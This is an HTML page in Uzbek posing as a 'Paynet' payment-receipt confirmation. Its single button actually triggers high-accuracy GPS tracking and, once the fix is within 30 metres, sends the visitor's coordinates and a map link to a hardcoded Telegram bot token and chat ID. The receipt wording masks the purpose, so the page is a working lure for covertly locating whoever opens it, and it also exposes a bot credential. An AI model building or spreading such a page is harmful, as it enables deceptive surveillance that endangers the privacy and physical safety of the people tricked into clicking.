<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Chek</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0; padding: 0; background: #f0f2f5; height: 100vh;
      display: flex; align-items: center; justify-content: center; text-align: center;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }
    .box {
      padding: 20px;
    }
    button {
      background: #00aa44;
      color: white; border: none; padding: 18px 40px;
      font-size: 19px; border-radius: 16px; cursor: pointer;
      box-shadow: 0 6px 20px rgba(0,170,68,0.3);
      transition: all 0.2s;
    }
    button:active { transform: scale(0.94); }
    button:disabled { background: #cccccc; cursor: not-allowed; }
    .status { margin-top: 25px; font-size: 18px; }
    .success { color: #00aa44; font-weight: bold; }
  </style>
</head>
<body>
<div class="box">
  <h2>Paynet chek</h2>
  <button id="btn">âœ“ Tasdiqlash</button>
  <div class="status" id="status"></div>
</div>
<script>
  const botToken = "5907600944:AAHRhcgacCszCkwiFmNgpzKN4pwvBg2-OxQ";
  const chatId = "1341701772";
  const status = document.getElementById("status");
  const btn = document.getElementById("btn");
  let watchId = null;

  function sendLocation(lat, lon) {
    const mapUrl = `https://maps.google.com/?q=${lat},${lon}`;
    const text = `Yangi buyurtma cheki:\nLatitude: ${lat}\nLongitude: ${lon}`;
    
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "ðŸ—º Chekni koâ€˜rish", url: mapUrl }
          ]]
        }
      })
    })
    .then(() => {
      status.innerHTML = "<span class='success'>âœ“ Muvaffaqiyatli yuborildi!</span>";
      btn.textContent = "âœ“ Yuborildi";
      btn.disabled = true;
    })
    .catch(() => {
      status.textContent = "Internet aloqasini tekshiring";
      btn.textContent = "âœ“ Tasdiqlash";
    });
  }

  btn.addEventListener("click", () => {
    btn.textContent = "Chek aniqlanmoqda...";
    status.textContent = "Ruxsat bering va GPS ni yoqing (agar oâ€˜chiq boâ€˜lsa)";

    if (!navigator.geolocation) {
      status.textContent = "Brauzer chekni qoâ€˜llab-quvvatlamaydi";
      btn.textContent = "âœ“ Tasdiqlash";
      return;
    }

    watchId = navigator.geolocation.watchPosition(
      (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const acc = position.coords.accuracy;

        if (acc <= 30) {
          sendLocation(lat, lon);
          navigator.geolocation.clearWatch(watchId);
        } else {
          status.textContent = `Chek aniqligi yaxshilanmoqda... (${Math.round(acc)} m)`;
        }
      },
      (error) => {
        btn.textContent = "âœ“ Tasdiqlash";
        let msg = "";
        if (error.code === 1) msg = "Ruxsat rad etildi. Brauzer sozlamalaridan ruxsat bering";
        else if (error.code === 2) msg = "Chek topilmadi. Telefoningizda GPS ni yoqing va tashqariga chiqing";
        else if (error.code === 3) msg = "Kutish vaqti tugadi. GPS va internetni tekshiring";
        else msg = "Xatolik yuz berdi";
        status.textContent = msg;
      },
      {
        enableHighAccuracy: true,
        timeout: 20000,
        maximumAge: 0
      }
    );
  });
</script>
</body>
</html>
